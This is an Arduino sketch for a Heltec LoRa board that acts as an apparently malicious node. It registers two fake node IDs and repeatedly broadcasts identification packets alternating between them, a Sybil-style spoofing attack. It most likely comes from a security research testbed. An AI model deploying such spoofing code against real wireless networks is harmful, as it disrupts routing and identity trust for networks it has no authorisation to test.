#include "heltec.h"
#include "Node.hpp"
#include "Malicious_Node.hpp"
//#include "Header.h"
#define BAND    433E6  //you can set band here directly,e.g. 868E6,915E6

int i;
byte t_message = 0x00;
byte IDE = 0x01;
Malicious_Node myself;
vector<uint8_t> ident{0x01,0x02};
vector<vector<uint8_t>> pack;
vector<uint8_t> to_send;
void setup() 
{
  Heltec.begin(true /*DisplayEnable Enable*/, true /*Heltec.LoRa Disable*/, true /*Serial Enable*/, true /*PABOOST Enable*/, BAND /*long BAND*/);
  LoRa.setSpreadingFactor(7);  
  myself.AddFakeID(ident.at(0));
  myself.AddFakeID(ident.at(1));
  pack=myself.Create_pack();
}

void loop() 
{
  for(i=0; i<20; i++)
  {
      /*It changes the packets between  ID1 or ID2 */
      if(i%2==0)
      {
        to_send=pack.at(0);
      }
      else
      {
        to_send=pack.at(1);     
      }
      t_message=to_send.at(0);
      IDE=to_send.at(1);
      Serial.print("Mensaje de identificacion: ");
      Serial.println(i+1);
      LoRa.beginPacket();
      LoRa.setTxPower(14,RF_PACONFIG_PASELECT_PABOOST);
      LoRa.write(t_message);
      LoRa.write(IDE);
      LoRa.endPacket();  
  }
  delay(20000);

}
